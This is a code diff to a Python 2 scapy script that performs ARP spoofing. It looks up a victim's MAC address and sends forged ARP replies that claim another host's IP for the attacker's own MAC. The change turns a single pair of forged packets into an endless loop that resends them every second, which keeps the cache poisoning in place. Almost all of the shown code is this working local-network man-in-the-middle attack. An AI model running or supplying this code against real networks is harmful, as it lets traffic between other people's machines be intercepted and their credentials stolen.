@@ -2,6 +2,7 @@ import socket
 import subprocess, shlex
 from scapy.all import *
 import sys
+import time
 from uuid import getnode as get_mac
 
 #Myip
@@ -36,7 +37,9 @@ Sendermac=result[0][1].hwsrc
 print "Senderip : "+Senderip+" Sendermac : "+Sendermac
 
 #Send Arpspoofing
-send(ARP(op=2, pdst=Senderip, psrc=Receiverip, hwdst=Sendermac, hwsrc=MyMac))
-send(ARP(op=2, pdst=Senderip, psrc=Receiverip, hwdst=Sendermac, hwsrc=MyMac))
+while 1:
+	send(ARP(op=2, pdst=Senderip, psrc=Receiverip, hwdst=Sendermac, hwsrc=MyMac))
+	send(ARP(op=2, pdst=Senderip, psrc=Receiverip, hwdst=Sendermac, hwsrc=MyMac))
+	time.sleep(1)
 
 
